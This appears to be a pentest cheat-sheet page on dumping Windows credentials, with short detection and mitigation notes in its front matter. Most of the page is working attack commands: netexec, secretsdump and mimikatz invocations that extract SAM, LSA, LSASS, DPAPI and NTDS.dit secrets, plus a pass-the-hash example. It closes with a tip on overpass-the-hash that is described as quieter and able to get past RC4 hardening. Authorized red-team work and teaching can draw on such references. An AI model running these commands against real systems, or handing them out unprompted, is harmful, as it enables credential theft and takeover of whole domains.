---
title: OS credential dumping
category: AD / Credentials
order: 40
tags: [lsass, sam, lsa, dpapi, ntds, mimikatz]
summary: >
  Once you are local admin on a host, harvest secrets from it: SAM (local),
  LSA secrets, cached domain creds, LSASS memory (live sessions), DPAPI, and —
  on a DC — the whole NTDS.dit.
prerequisites:
  - Local administrator (or SYSTEM) on the target host ($ip)
  - For NTDS: local admin on a Domain Controller
tools: [netexec, impacket (secretsdump), nanodump, mimikatz, pypykatz]
detection:
  - Handle open on lsass.exe by non-AV processes; comsvcs MiniDump
  - Shadow-copy creation on a DC; secretsdump SMB service creation
mitigation:
  - LSASS PPL + Credential Guard; block third-party lsass access
  - Least privilege; disable WDigest; limit cached logons
refs:
  - { label: "HackTricks — dumping", url: "https://book.hacktricks.xyz/windows-hardening/stealing-credentials" }
  - { label: "nanodump", url: "https://github.com/fortra/nanodump" }
---

## Local secrets (SAM + LSA)

```sh
# remote, via netexec (local admin needed)
netexec smb $ip -u $user -p $password --local-auth --sam --lsa
# impacket
secretsdump.py $domain/$user:$password@$ip
secretsdump.py -hashes :$nthash administrator@$ip     # PtH, local admin
```

## LSASS memory (live logons → hashes/tickets)

```sh
# netexec, choose a method (comsvcs/nanodump/procdump)
netexec smb $ip -u $user -p $password -M lsassy
netexec smb $ip -u $user -p $password -M nanodump
```

```powershell
# on-host, classic
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::ekeys      # Kerberos keys (AES) for overpass-the-hash
```

## DPAPI (browser creds, saved secrets)

```sh
netexec smb $ip -u $user -p $password --dpapi
```

## NTDS.dit (on a Domain Controller)

```sh
# pull the whole directory database (all domain hashes)
netexec smb $dc_ip -u $user -p $password --ntds
secretsdump.py $domain/$user:$password@$dc_ip -just-dc
```

> LSASS `ekeys` give the AES256 key → use it for **overpass-the-hash** (request
> a TGT) instead of the NT hash, which is quieter and survives RC4 hardening.
